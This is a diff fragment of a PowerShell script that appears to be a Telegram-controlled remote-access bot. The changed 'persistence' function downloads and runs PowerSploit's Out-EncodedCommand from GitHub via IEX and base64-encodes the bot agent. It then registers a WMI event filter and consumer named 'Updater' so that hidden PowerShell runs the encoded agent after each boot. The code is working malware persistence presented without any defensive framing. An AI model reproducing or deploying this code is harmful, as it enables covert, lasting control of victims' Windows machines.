@@ -177,8 +177,7 @@ Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
-$agent_bot = create_agent -botkey $botkey -chat_id $chat_id
-$code =[system.convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($agent_bot))
+$agent_bot = create_agent -botkey $botkey -chat_id $chat_id ; $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1"; $ruta_temp = $ruta_temp + "\temp.ps1"; $agent_bot | out-file -Encoding ascii $ruta_temp ; IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content ; $code = Out-EncodedCommand -Path $ruta_temp -EncodedOutput ; Remove-Item $ruta_temp ;  $code = $code -replace '"',""; $code = $code -replace "powershell  -E ", ""
 Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
